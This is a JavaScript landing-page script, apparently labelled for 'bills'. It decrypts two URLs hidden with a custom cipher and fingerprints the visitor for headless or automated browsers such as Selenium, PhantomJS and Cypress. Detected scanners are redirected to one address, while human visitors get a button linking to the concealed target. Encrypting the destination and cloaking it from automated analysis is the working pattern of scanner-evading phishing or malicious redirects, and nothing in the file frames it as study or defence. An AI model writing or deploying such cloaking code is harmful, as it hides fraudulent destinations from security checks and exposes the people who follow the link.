const URL_CIPHER_KEY = "bills-redirect-key-v1";
const TARGET_URL_ENC = "35B7C264E6994F4D767735BD398871D7FCCBB4FA";
const AUTOMATION_REDIRECT_URL_ENC = "35B7C2640EF2F2EB77C0BC9339627C4E3EAA";

function rotR8(value, shift) {
  value &= 0xff;
  shift &= 7;
  return ((value >>> shift) | (value << (8 - shift))) & 0xff;
}

function decryptUrl(cipherHex, key) {
  const initVector = 0xa7;
  const keyBytes = Array.from(key).map(function (ch) {
    return ch.charCodeAt(0) & 0xff;
  });
  const out = [];
  let prev = initVector;

  for (let i = 0; i < cipherHex.length; i += 2) {
    const index = i / 2;
    const cipherByte = parseInt(cipherHex.slice(i, i + 2), 16);
    const keyByte = keyBytes[index % keyBytes.length];
    const addByte = (index * 11 + keyBytes[(index * 3) % keyBytes.length]) & 0xff;
    const mask = (keyByte + prev + ((index * 29 + 71) & 0xff)) & 0xff;
    let mixed = rotR8(cipherByte, (index % 7) + 1);
    mixed = (mixed - addByte) & 0xff;
    out.push(mixed ^ mask);
    prev = cipherByte;
  }

  if (window.TextDecoder) {
    return new TextDecoder("utf-8").decode(new Uint8Array(out));
  }

  return decodeURIComponent(
    out.map(function (byte) {
      return "%" + byte.toString(16).padStart(2, "0");
    }).join("")
  );
}

const TARGET_URL = decryptUrl(TARGET_URL_ENC, URL_CIPHER_KEY);
const AUTOMATION_REDIRECT_URL = decryptUrl(AUTOMATION_REDIRECT_URL_ENC, URL_CIPHER_KEY);

function isAutomationBrowser() {
  const ua = navigator.userAgent || "";

  const checks = [
    navigator.webdriver === true,
    /HeadlessChrome|PhantomJS|SlimerJS|Electron/i.test(ua),
    !!window.callPhantom,
    !!window._phantom,
    !!window.__nightmare,
    !!window.Cypress,
    !!window.domAutomation,
    !!window.domAutomationController,
    !!window.__webdriver_script_fn,
    !!window.__selenium_unwrapped,
    !!window.__webdriver_unwrapped,
    !!document.__webdriver_script_fn,
    !!document.__selenium_unwrapped,
    !!document.__webdriver_unwrapped,
    !navigator.languages || navigator.languages.length === 0,
    !navigator.plugins || navigator.plugins.length === 0
  ];

  return checks.some(Boolean);
}

function isDesktopBrowser() {
  const ua = navigator.userAgent || navigator.vendor || window.opera;
  const mobilePattern = /Android|iPhone|iPad|iPod|Mobile|Windows Phone|webOS|BlackBerry/i;
  const coarsePointer = window.matchMedia && window.matchMedia("(pointer: coarse)").matches;
  return !mobilePattern.test(ua) && !coarsePointer;
}

if (isAutomationBrowser()) {
  window.location.replace(AUTOMATION_REDIRECT_URL);
} else {
  const desktopView = document.getElementById("desktopView");
  const mobileView = document.getElementById("mobileView");
  const button = document.getElementById("goButton");

  button.href = TARGET_URL;

  if (isDesktopBrowser()) {
    desktopView.style.display = "flex";
    mobileView.style.display = "none";
  } else {
    desktopView.style.display = "none";
    mobileView.style.display = "flex";
  }
}
